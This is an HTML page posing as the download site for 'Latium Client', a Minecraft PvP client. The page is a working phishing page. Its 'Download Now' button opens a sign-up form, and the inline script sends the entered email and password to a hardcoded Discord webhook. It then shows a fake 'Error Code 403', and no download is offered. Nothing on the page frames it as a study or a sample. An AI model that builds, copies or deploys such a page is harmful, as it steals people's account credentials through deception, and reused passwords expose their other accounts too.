<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Latium Client</title>
  <style>
    :root {
      --text-color: #fff;
      --text-darker-color: #ccc;
      --blocks-shadow-color: rgba(0, 0, 0, 0.7);
      --header-shadow-color: rgba(0, 0, 0, 0.5);
      --button-shadow-color: rgba(0, 0, 0, 0.4);
    }

    body, html {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #111;
      color: #eee;
    }

    #first_panel {
      position: relative;
      width: 100%;
      min-height: 400px;
      overflow: hidden;
    }

    #first_panel_content {
      padding: 60px 10px 100px;
      max-width: 100%;
      min-height: 100vh;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: center;
      background: url("https://wallpapercave.com/uwp/uwp4758681.jpeg") no-repeat fixed;
      background-size: cover;
    }

    #first_panel_content .texts {
      width: fit-content;
      max-width: 100vw;
      color: white;
      padding: 50px 0;
      text-align: center;
      text-shadow: 0 0 6px var(--blocks-shadow-color);
      margin: 20px 0;
      background-color: rgba(20, 20, 20, 0.8);
      border-radius: 40px;
      backdrop-filter: blur(20px) saturate(1.6);
      -webkit-backdrop-filter: blur(20px) saturate(1.6);
    }

    .text_title {
      font-size: 2.2em;
      padding: 50px !important;
      border-radius: 35px !important;
    }

    .text_title h1 {
      margin: 0;
      font-weight: 600 !important;
      color: var(--text-color) !important;
    }

    #downloadBtn {
      background: #4fc3f7;
      border: none;
      padding: 0.75rem 1.5rem;
      font-size: 1rem;
      cursor: pointer;
      border-radius: 5px;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0, 0, 0, 0.7);
    }

    .modal-content {
      background-color: #222;
      margin: 10% auto;
      padding: 20px;
      border: 1px solid #444;
      width: 300px;
      border-radius: 5px;
      color: #eee;
    }

    .close {
      color: #aaa;
      float: right;
      font-size: 28px;
      cursor: pointer;
    }

    .modal-content input {
      width: 100%;
      padding: 8px;
      margin: 5px 0 15px;
      border: 1px solid #555;
      border-radius: 3px;
      background: #333;
      color: #eee;
    }

    .modal-content button {
      width: 100%;
      padding: 10px;
      background: #4fc3f7;
      border: none;
      border-radius: 3px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <section id="first_panel">
    <div id="first_panel_content">
      <div class="texts">
        <div class="text_title">
          <h1>Latium Client</h1>
        </div>
        <p>The Ultimate Minecraft PvP Experience</p>
        <button id="downloadBtn">Download Now</button>
      </div>
    </div>
  </section>

  <div id="signupModal" class="modal">
    <div class="modal-content">
      <span id="closeModal" class="close">&times;</span>
      <div id="modalBody">
        <h2>Sign Up to Download</h2>
        <form id="signupForm">
          <label for="email">Email:</label>
          <input type="email" id="email" name="email" required />
          <label for="password">Password:</label>
          <input type="password" id="password" name="password" required />
          <button type="submit">Submit & Download</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1298847513331109939/sZEnzKPPl93oKGq-O0WXOSgh4NOZd4CcCYyNfJRqS213QKPN5IKyL76k8qgmQAJrXnEy';
    const downloadBtn = document.getElementById('downloadBtn');
    const modal = document.getElementById('signupModal');
    const closeModal = document.getElementById('closeModal');
    const form = document.getElementById('signupForm');
    const modalBody = document.getElementById('modalBody');

    downloadBtn.addEventListener('click', () => {
      modal.style.display = 'block';
    });

    closeModal.addEventListener('click', () => {
      modal.style.display = 'none';
    });

    window.addEventListener('click', (e) => {
      if (e.target === modal) modal.style.display = 'none';
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      try {
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `Email: ${email} | Password: ${password}` })
        });
        modalBody.innerHTML = '<h2>Error Code 403</h2>';
      } catch (err) {
        alert('Submission failed. Please try again.');
      }
    });
  </script>
</body>
</html>
